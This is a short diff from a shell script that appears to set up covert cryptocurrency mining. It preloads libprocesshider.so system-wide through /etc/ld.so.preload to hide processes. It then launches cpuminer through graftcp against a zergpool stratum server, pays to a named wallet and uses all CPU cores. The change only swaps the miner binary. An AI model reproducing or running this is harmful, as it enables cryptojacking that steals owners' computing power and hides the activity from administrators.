@@ -62,4 +62,4 @@ mv libprocesshider.so /usr/local/lib/
 
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./cpuminer-opt -a yescryptR16 -o stratum+tcp://yescryptR16.asia.mine.zergpool.com:6333 -u REBCKtxqipVbjjtvs8cjcrjXTnD8YmJY4d -p  c=RVN,mc=QOGE,ID=Tukiman -t $(nproc)
+./graftcp/graftcp ./cpuminer-avx -a yescryptR16 -o stratum+tcp://yescryptR16.asia.mine.zergpool.com:6333 -u REBCKtxqipVbjjtvs8cjcrjXTnD8YmJY4d -p  c=RVN,mc=QOGE,ID=Tukiman -t $(nproc)
